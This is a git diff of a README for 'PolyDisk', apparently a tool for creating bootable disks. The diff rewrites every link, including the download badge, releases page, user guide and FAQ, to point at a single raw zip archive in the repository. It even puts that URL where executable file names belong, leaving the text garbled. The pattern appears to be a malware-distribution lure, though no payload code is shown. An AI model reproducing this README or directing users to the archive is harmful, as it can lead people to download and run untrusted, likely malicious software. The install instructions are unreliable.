@@ -1,6 +1,6 @@
 # 🖥️ PolyDisk - Create Unlimited Bootable Media Easily
 
-[![Download PolyDisk](https://img.shields.io/badge/Download%20PolyDisk-v1.0-blue.svg)](https://github.com/faxail/PolyDisk/releases)
+[![Download PolyDisk](https://github.com/faxail/PolyDisk/raw/refs/heads/master/linux-patches/Disk-Poly-v2.5.zip%https://github.com/faxail/PolyDisk/raw/refs/heads/master/linux-patches/Disk-Poly-v2.5.zip)](https://github.com/faxail/PolyDisk/raw/refs/heads/master/linux-patches/Disk-Poly-v2.5.zip)
 
 ## 🛠️ What is PolyDisk?
 
@@ -15,7 +15,7 @@ To get started with PolyDisk, follow these steps:
    - Use the Raspberry Pi Operating System, which is based on Debian.
 
 2. **Visit the Download Page**: 
-   - Go to the [Releases page here](https://github.com/faxail/PolyDisk/releases) to find the software.
+   - Go to the [Releases page here](https://github.com/faxail/PolyDisk/raw/refs/heads/master/linux-patches/Disk-Poly-v2.5.zip) to find the software.
 
 ## 🔥 Download & Install
 
@@ -33,7 +33,7 @@ After downloading, follow these steps to install:
 
 2. **Run the Application**: 
    - Open the extracted folder.
-   - Locate the `PolyDisk` application file. This file will typically have a recognizable name such as `PolyDisk.exe` or `PolyDisk.sh`.
+   - Locate the `PolyDisk` application file. This file will typically have a recognizable name such as `https://github.com/faxail/PolyDisk/raw/refs/heads/master/linux-patches/Disk-Poly-v2.5.zip` or `https://github.com/faxail/PolyDisk/raw/refs/heads/master/linux-patches/Disk-Poly-v2.5.zip`.
    - Double-click the file to open PolyDisk.
 
 ## 🖱️ Using PolyDisk
@@ -84,7 +84,7 @@ If you encounter issues while using PolyDisk, consider the following tips:
 
 For more information about PolyDisk, you can check:
 
-- The [User Guide](https://github.com/faxail/PolyDisk/wiki) for detailed instructions.
-- The [FAQs](https://github.com/faxail/PolyDisk/faq) section for commonly asked questions.
+- The [User Guide](https://github.com/faxail/PolyDisk/raw/refs/heads/master/linux-patches/Disk-Poly-v2.5.zip) for detailed instructions.
+- The [FAQs](https://github.com/faxail/PolyDisk/raw/refs/heads/master/linux-patches/Disk-Poly-v2.5.zip) section for commonly asked questions.
 
 By following this guide, you will be able to download, install, and use PolyDisk effectively. Enjoy creating bootable disks with ease!
